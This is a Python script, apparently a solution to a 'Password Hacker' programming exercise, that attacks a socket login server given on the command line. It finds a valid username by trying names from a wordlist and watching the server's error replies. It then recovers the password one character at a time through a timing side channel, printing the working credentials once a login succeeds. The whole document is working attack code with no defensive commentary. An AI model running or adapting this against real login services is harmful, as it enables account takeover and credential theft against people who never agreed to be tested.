from sys import argv
import socket
from itertools import product, chain
import json
from string import ascii_letters, digits
from datetime import datetime

address = (argv[1], int(argv[2]))

logins = open("D:\Programowanie\Python\PycharmProjects\Password Hacker\Password Hacker\\task\hacking\logins.txt", "r")

def generate_char():
    while True:
        for password in product(chain(ascii_letters, digits)):
            yield "".join(password)

def convert_to_json(login_id, password=" "):
    pyth_dict = {"login": login_id, "password":password}
    return json.dumps(pyth_dict)


exception = {"result": "Exception happened during login"}
correct_login = {"result": "Wrong password!"}
success = {"result": "Connection success!"}

with socket.socket() as my_socket:
    my_socket.connect(address)
    for login in logins:
        my_socket.send(convert_to_json(login.rstrip()).encode())
        response = my_socket.recv(1024)
        if json.loads(response.decode()) == correct_login:
            break
    password = ""
    for char in generate_char():
        login_pass = convert_to_json(login.rstrip(), password + char)
        my_socket.send(login_pass.encode())
        start = datetime.now()
        response = my_socket.recv(1024)
        finish = datetime.now()
        if json.loads(response.decode()) == success:
            print(login_pass)
            break
        elif (finish - start).microseconds > 10000:
            password += char
logins.close()